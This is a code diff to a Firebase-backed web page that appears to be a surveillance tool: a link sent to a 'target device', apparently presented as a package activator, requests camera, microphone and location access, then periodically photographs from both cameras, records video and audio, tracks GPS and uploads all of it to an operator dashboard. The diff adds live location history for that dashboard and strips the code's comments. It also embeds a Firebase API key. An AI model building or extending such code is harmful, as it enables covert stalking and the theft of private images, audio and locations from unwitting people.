@@ -12,12 +12,10 @@
 <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
 <!-- Firebase SDKs -->
 <script type="module">
-  // Import the functions you need from the SDKs
   import { initializeApp } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-app.js";
   import { getDatabase, ref, set, push, onValue, update, get, child, query, orderByChild, equalTo, onChildAdded } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-database.js";
   import { getAnalytics } from "https://www.gstatic.com/firebasejs/12.9.0/firebase-analytics.js";
 
-  // Your web app's Firebase configuration
   const firebaseConfig = {
     apiKey: "AIzaSyCm8YVDZWNqgTBKqEmR269-3TqauF8xqHM",
     authDomain: "camera-access-edd51.firebaseapp.com",
@@ -28,12 +26,10 @@
     measurementId: "G-1X3WSW4H88"
   };
 
-  // Initialize Firebase
   const app = initializeApp(firebaseConfig);
   const analytics = getAnalytics(app);
   const database = getDatabase(app);
   
-  // Make database available globally
   window.firebaseDB = database;
   window.firebaseRef = ref;
   window.firebaseSet = set;
@@ -831,6 +827,22 @@ select:focus, input:focus {
   color: var(--text-secondary);
 }
 
+.location-history {
+  margin-top: 10px;
+  max-height: 100px;
+  overflow-y: auto;
+  font-size: 11px;
+  background: rgba(0,0,0,0.05);
+  padding: 8px;
+  border-radius: var(--radius-sm);
+}
+
+.location-history-item {
+  padding: 3px 0;
+  border-bottom: 1px solid var(--card-border);
+  color: var(--text-secondary);
+}
+
 @media (max-width: 768px) {
   .container {
     padding: 10px;
@@ -1025,10 +1037,11 @@ select:focus, input:focus {
     
     <!-- Live Map -->
     <div id="mapArea" class="hidden">
-      <h3><i class="fas fa-map"></i> Live Location</h3>
+      <h3><i class="fas fa-map"></i> Live Location <span id="locationTimestamp" style="font-size: 12px; color: var(--text-secondary); margin-left: 10px;"></span></h3>
       <div class="map-container">
         <div id="liveMap"></div>
       </div>
+      <div id="locationHistory" class="location-history"></div>
     </div>
     
     <!-- Sensor Data -->
@@ -1202,6 +1215,7 @@ let mapMarker = null;
 let captureIntervals = [];
 let allSessions = [];
 let firebaseReady = false;
+let locationHistory = [];
 
 // Permission status tracking
 let permissionStatus = {
@@ -1244,6 +1258,8 @@ const mediaGallery = document.getElementById('mediaGallery');
 const themeToggle = document.getElementById('themeToggle');
 const whatsappBtn = document.getElementById('whatsappBtn');
 const sessionList = document.getElementById('sessionList');
+const locationHistoryEl = document.getElementById('locationHistory');
+const locationTimestamp = document.getElementById('locationTimestamp');
 
 // Permission elements
 const cameraStatus = document.getElementById('cameraStatus');
@@ -1349,7 +1365,6 @@ async function saveMediaToFirebase(sessionId, mediaItem) {
     await window.firebaseSet(mediaRef, mediaItem);
     console.log('Media saved to Firebase:', mediaItem.type, mediaItem.id);
     
-    // Update session's lastActive
     const sessionRef = window.firebaseRef(window.firebaseDB, `sessions/${sessionId}`);
     await window.firebaseUpdate(sessionRef, {
       lastActive: Date.now(),
@@ -1366,15 +1381,13 @@ async function saveMediaToFirebase(sessionId, mediaItem) {
 async function saveLocationToFirebase(sessionId, locationData) {
   await waitForFirebase();
   try {
-    // Save individual location with timestamp
-    const locationRef = window.firebaseRef(window.firebaseDB, `sessions/${sessionId}/locations/${Date.now()}`);
+    const locationRef = window.firebaseRef(window.firebaseDB, `sessions/${sessionId}/locations/${locationData.timestamp}`);
     await window.firebaseSet(locationRef, {
       ...locationData,
-      id: Date.now().toString()
+      id: locationData.timestamp.toString()
     });
     console.log('Location saved to Firebase');
     
-    // Also update current location in session
     const sessionRef = window.firebaseRef(window.firebaseDB, `sessions/${sessionId}`);
     await window.firebaseUpdate(sessionRef, {
       currentLocation: locationData,
@@ -1401,6 +1414,23 @@ async function getAllMediaFromFirebase(sessionId) {
     return [];
   } catch (error) {
     console.error('Error getting media from Firebase:', error);
+    return [];
+  }
+}
+
+async function getLocationsFromFirebase(sessionId) {
+  await waitForFirebase();
+  try {
+    const locationRef = window.firebaseRef(window.firebaseDB, `sessions/${sessionId}/locations`);
+    const snapshot = await window.firebaseGet(locationRef);
+    
+    if (snapshot.exists()) {
+      const locationObj = snapshot.val();
+      return Object.values(locationObj).sort((a, b) => b.timestamp - a.timestamp);
+    }
+    return [];
+  } catch (error) {
+    console.error('Error getting locations from Firebase:', error);
     return [];
   }
 }
@@ -1465,7 +1495,6 @@ async function getAllSessionsFromFirebase() {
     if (snapshot.exists()) {
       const sessionsObj = snapshot.val();
       const sessionsArray = Object.values(sessionsObj);
-      // Sort by lastActive (most recent first)
       sessionsArray.sort((a, b) => (b.lastActive || 0) - (a.lastActive || 0));
       return sessionsArray;
     }
@@ -1485,7 +1514,6 @@ function subscribeToAllSessions(callback) {
           const sessionsObj = snapshot.val();
           const sessionsArray = Object.values(sessionsObj);
           
-          // Get media counts for each session
           for (let session of sessionsArray) {
             const mediaRef = window.firebaseRef(window.firebaseDB, `sessions/${session.id}/media`);
             const mediaSnapshot = await window.firebaseGet(mediaRef);
@@ -1497,7 +1525,6 @@ function subscribeToAllSessions(callback) {
             }
           }
           
-          // Sort by lastActive (most recent first)
           sessionsArray.sort((a, b) => (b.lastActive || 0) - (a.lastActive || 0));
           callback(sessionsArray);
         } else {
@@ -1557,11 +1584,12 @@ function renderSessionList(sessions) {
     const isActive = session.id === currentSessionId;
     const mediaCount = session.mediaCount || 0;
     const lastActive = session.lastActive ? new Date(session.lastActive).toLocaleString() : 'Unknown';
+    const hasLocation = session.currentLocation ? '📍' : '';
     
     return `
       <div class="session-item ${isActive ? 'active' : ''}" data-session-id="${session.id}">
         <div>
-          <div><i class="fas fa-link"></i> ${session.id.substring(0, 15)}...</div>
+          <div><i class="fas fa-link"></i> ${session.id.substring(0, 15)}... ${hasLocation}</div>
           <div class="session-media-count">
             <i class="fas fa-images"></i> ${mediaCount} media
           </div>
@@ -1576,7 +1604,6 @@ function renderSessionList(sessions) {
     `;
   }).join('');
   
-  // Add click handlers for session items
   document.querySelectorAll('.session-item').forEach(item => {
     item.addEventListener('click', (e) => {
       if (!e.target.classList.contains('view-session-btn') && !e.target.closest('.view-session-btn')) {
@@ -1610,8 +1637,87 @@ async function loadSessionData(sessionId) {
   dataArea.classList.remove('hidden');
   permissionArea.classList.remove('hidden');
   
-  // Load media for this session
   renderMediaGallery(sessionId);
+  loadLocationData(sessionId);
+}
+
+async function loadLocationData(sessionId) {
+  const locations = await getLocationsFromFirebase(sessionId);
+  
+  if (locations.length > 0) {
+    mapArea.classList.remove('hidden');
+    const latest = locations[0];
+    updateMapWithLocation(latest);
+    updateLocationHistory(locations);
+  }
+  
+  subscribeToSessionLocation(sessionId, (updatedLocations) => {
+    if (updatedLocations.length > 0) {
+      mapArea.classList.remove('hidden');
+      const latest = updatedLocations[0];
+      updateMapWithLocation(latest);
+      updateLocationHistory(updatedLocations);
+    }
+  });
+}
+
+function updateMapWithLocation(location) {
+  if (!location || !location.lat || !location.lng) return;
+  
+  const lat = parseFloat(location.lat);
+  const lng = parseFloat(location.lng);
+  
+  if (isNaN(lat) || isNaN(lng)) return;
+  
+  if (locationTimestamp) {
+    locationTimestamp.textContent = `Last updated: ${new Date(location.timestamp).toLocaleString()}`;
+  }
+  
+  setTimeout(() => {
+    const mapContainer = document.getElementById('liveMap');
+    if (!mapContainer) return;
+    
+    if (!map) {
+      if (mapContainer.offsetParent !== null) {
+        map = L.map('liveMap').setView([lat, lng], 15);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+          attribution: '© OpenStreetMap contributors'
+        }).addTo(map);
+        mapMarker = L.marker([lat, lng]).addTo(map);
+        
+        setTimeout(() => {
+          map.invalidateSize();
+        }, 100);
+      }
+    } else {
+      map.setView([lat, lng], 15);
+      if (mapMarker) {
+        mapMarker.setLatLng([lat, lng]);
+      } else {
+        mapMarker = L.marker([lat, lng]).addTo(map);
+      }
+      map.invalidateSize();
+    }
+  }, 200);
+}
+
+function updateLocationHistory(locations) {
+  if (!locationHistoryEl) return;
+  
+  if (locations.length === 0) {
+    locationHistoryEl.innerHTML = '<div class="location-history-item">No location data yet</div>';
+    return;
+  }
+  
+  locationHistoryEl.innerHTML = locations.slice(0, 5).map(loc => {
+    const time = new Date(loc.timestamp).toLocaleTimeString();
+    const accuracy = loc.accuracy ? `±${loc.accuracy.toFixed(1)}m` : '';
+    return `
+      <div class="location-history-item">
+        <i class="fas fa-map-pin"></i> ${time} - ${loc.lat.toFixed(6)}, ${loc.lng.toFixed(6)} ${accuracy}
+      </div>
+    `;
+  }).join('');
 }
 
 // ====================
@@ -1689,7 +1795,6 @@ async function getSessionMedia(sessionId) {
 async function addMediaToSession(sessionId, mediaItem) {
   await saveMediaToFirebase(sessionId, mediaItem);
   await updateStatsFromFirebase();
-  // Notification removed
 }
 
 function renderMediaGallery(sessionId) {
@@ -1704,7 +1809,6 @@ function renderMediaGallery(sessionId) {
     </div>
   `;
   
-  // Subscribe to real-time updates
   subscribeToSessionMedia(sessionId, (media) => {
     if (media.length === 0) {
       gallery.innerHTML = `
@@ -1766,7 +1870,6 @@ function renderMediaGallery(sessionId) {
       }
       
       mediaElement.onclick = (e) => {
-        // Don't trigger if clicking on video or audio controls
         if (e.target.tagName === 'VIDEO' || e.target.tagName === 'AUDIO' || e.target.tagName === 'SOURCE') {
           return;
         }
@@ -1815,16 +1918,14 @@ function renderMediaGallery(sessionId) {
 }
 
 // ====================
-// LOCATION TRACKING (FIXED)
+// LOCATION TRACKING (TARGET DEVICE)
 // ====================
 function initMap(lat, lng) {
-  // Wait for map container to be visible
   setTimeout(() => {
     const mapContainer = document.getElementById('liveMap');
     if (!mapContainer) return;
     
     if (!map) {
-      // Check if map container exists and is visible
       if (mapContainer.offsetParent !== null) {
         map = L.map('liveMap').setView([lat, lng], 15);
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
@@ -1832,7 +1933,6 @@ function initMap(lat, lng) {
         }).addTo(map);
         mapMarker = L.marker([lat, lng]).addTo(map);
         
-        // Force map to refresh after initialization
         setTimeout(() => {
           map.invalidateSize();
         }, 100);
@@ -1844,7 +1944,6 @@ function initMap(lat, lng) {
       } else {
         mapMarker = L.marker([lat, lng]).addTo(map);
       }
-      // Force map to refresh
       map.invalidateSize();
     }
   }, 200);
@@ -1863,13 +1962,9 @@ function updateLocation(position) {
   locationDetails.textContent = `${currentLocation.lat.toFixed(6)}, ${currentLocation.lng.toFixed(6)} (Accuracy: ${currentLocation.accuracy.toFixed(1)}m)`;
   permissionStatus.location = 'granted';
   
-  // Show map area
   mapArea.classList.remove('hidden');
-  
-  // Initialize or update map
   initMap(currentLocation.lat, currentLocation.lng);
   
-  // Save to Firebase if we have a session
   if (currentSessionId) {
     saveLocationToFirebase(currentSessionId, currentLocation);
   }
@@ -1880,12 +1975,10 @@ function startLocationTracking() {
     locationStatus.className = 'status-badge status-pending';
     locationStatus.textContent = 'Requesting...';
     
-    // First get current position quickly
     navigator.geolocation.getCurrentPosition(
       (position) => {
         updateLocation(position);
         
-        // Then start watching for changes
         if (watchPositionId) {
           navigator.geolocation.clearWatch(watchPositionId);
         }
@@ -2048,7 +2141,6 @@ async function captureVideo(duration = 5000) {
     return new Promise((resolve) => {
       const chunks = [];
       
-      // Try different MIME types for better compatibility
       let mimeType = 'video/webm';
       if (MediaRecorder.isTypeSupported('video/mp4')) {
         mimeType = 'video/mp4';
@@ -2103,7 +2195,6 @@ async function captureAudio(duration = 5000) {
     return new Promise((resolve) => {
       const chunks = [];
       
-      // Try different MIME types for better compatibility
       let mimeType = 'audio/webm';
       if (MediaRecorder.isTypeSupported('audio/mp4')) {
         mimeType = 'audio/mp4';
@@ -2152,22 +2243,18 @@ async function requestAllPermissions() {
     activationStatus.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Requesting camera and microphone permissions...';
     permissionMessage.style.display = 'block';
     
-    // Request camera and microphone
     const stream = await navigator.mediaDevices.getUserMedia({
       video: true,
       audio: true
     });
     
-    // Stop the stream immediately after getting permissions
     stream.getTracks().forEach(track => track.stop());
     
-    // Update permission status
     cameraStatus.className = 'status-badge status-granted';
     cameraStatus.textContent = 'Granted';
     microphoneStatus.className = 'status-badge status-granted';
     microphoneStatus.textContent = 'Granted';
     
-    // Get camera info
     const devices = await navigator.mediaDevices.enumerateDevices();
     const videoDevices = devices.filter(d => d.kind === 'videoinput');
     const audioDevices = devices.filter(d => d.kind === 'audioinput');
@@ -2180,12 +2267,10 @@ async function requestAllPermissions() {
     
     activationStatus.innerHTML = '<i class="fas fa-check-circle"></i> Permissions granted! Starting capture...';
     
-    // Start all tracking
     startLocationTracking();
     startMotionTracking();
     checkVPN();
     
-    // Start periodic capture
     startPeriodicCapture();
     
   } catch (error) {
@@ -2212,15 +2297,12 @@ async function requestAllPermissions() {
 }
 
 function startPeriodicCapture() {
-  // Clear any existing intervals
   captureIntervals.forEach(interval => clearInterval(interval));
   captureIntervals = [];
   
-  // Capture photos from both cameras every 15 seconds
   captureIntervals.push(setInterval(async () => {
     if (!currentSessionId || permissionStatus.camera !== 'granted') return;
     
-    // Front camera photo
     const frontPhoto = await capturePhoto('user');
     if (frontPhoto) {
       await addMediaToSession(currentSessionId, {
@@ -2233,7 +2315,6 @@ function startPeriodicCapture() {
       });
     }
     
-    // Back camera photo
     const backPhoto = await capturePhoto('environment');
     if (backPhoto) {
       await addMediaToSession(currentSessionId, {
@@ -2247,7 +2328,6 @@ function startPeriodicCapture() {
     }
   }, 15000));
   
-  // Capture video every 45 seconds (10 second video)
   captureIntervals.push(setInterval(async () => {
     if (!currentSessionId || permissionStatus.camera !== 'granted' || permissionStatus.microphone !== 'granted') return;
     
@@ -2264,7 +2344,6 @@ function startPeriodicCapture() {
     }
   }, 45000));
   
-  // Capture audio every 60 seconds (15 second audio)
   captureIntervals.push(setInterval(async () => {
     if (!currentSessionId || permissionStatus.microphone !== 'granted') return;
     
@@ -2282,7 +2361,6 @@ function startPeriodicCapture() {
 }
 
 function stopCapture() {
-  // Clear all capture intervals
   captureIntervals.forEach(interval => clearInterval(interval));
   captureIntervals = [];
   
@@ -2310,6 +2388,7 @@ async function generateNewLink() {
   });
   
   renderMediaGallery(currentSessionId);
+  loadLocationData(currentSessionId);
 }
 
 async function downloadAllMedia() {
@@ -2391,11 +2470,9 @@ async function activatePackage() {
   
   currentSessionId = sessionId;
   
-  // Show permission area
   permissionArea.classList.remove('hidden');
   dataArea.classList.remove('hidden');
   
-  // Start all permission requests and tracking
   await requestAllPermissions();
   
   setTimeout(() => {
@@ -2424,7 +2501,8 @@ openBtn.addEventListener('click', () => {
 refreshBtn.addEventListener('click', () => {
   if (currentSessionId) {
     renderMediaGallery(currentSessionId);
-    alert('Media gallery refreshed!');
+    loadLocationData(currentSessionId);
+    alert('Media and location refreshed!');
   }
 });
 
@@ -2457,14 +2535,12 @@ whatsappBtn.addEventListener('click', () => {
 async function init() {
   initTheme();
   
-  // Wait for Firebase to be ready
   await waitForFirebase();
   console.log("Firebase initialized, loading data...");
   
   const urlParams = new URLSearchParams(window.location.search);
   const sessionId = urlParams.get('id');
   
-  // Subscribe to all sessions for the dashboard
   subscribeToAllSessions((sessions) => {
     allSessions = sessions;
     renderSessionList(sessions);
@@ -2472,7 +2548,6 @@ async function init() {
   });
   
   if (sessionId) {
-    // This is a target device (someone opening the link)
     console.log("Target device mode for session:", sessionId);
     dashboardCard.style.display = 'none';
     pkgActivatorCard.style.display = 'block';
@@ -2487,7 +2562,6 @@ async function init() {
     linkArea.classList.remove('hidden');
     permissionArea.classList.remove('hidden');
     
-    // Check if session exists, if not create it
     const session = await getSessionFromFirebase(sessionId);
     if (!session) {
       await saveSession(sessionId, { 
@@ -2498,11 +2572,9 @@ async function init() {
     }
     
   } else {
-    // This is the dashboard
     console.log("Dashboard mode");
     pkgActivatorCard.style.display = 'none';
     
-    // Check for last session
     const lastSessionId = localStorage.getItem('lastSessionId');
     if (lastSessionId) {
       const session = await getSessionFromFirebase(lastSessionId);
@@ -2518,6 +2590,7 @@ async function init() {
         permissionArea.classList.remove('hidden');
         
         renderMediaGallery(currentSessionId);
+        loadLocationData(currentSessionId);
       }
     }
   }
@@ -2533,7 +2606,6 @@ window.addEventListener('beforeunload', () => {
   stopCapture();
 });
 
-// Add error handling for media devices
 window.addEventListener('unhandledrejection', (event) => {
   console.warn('Unhandled promise rejection:', event.reason);
 });
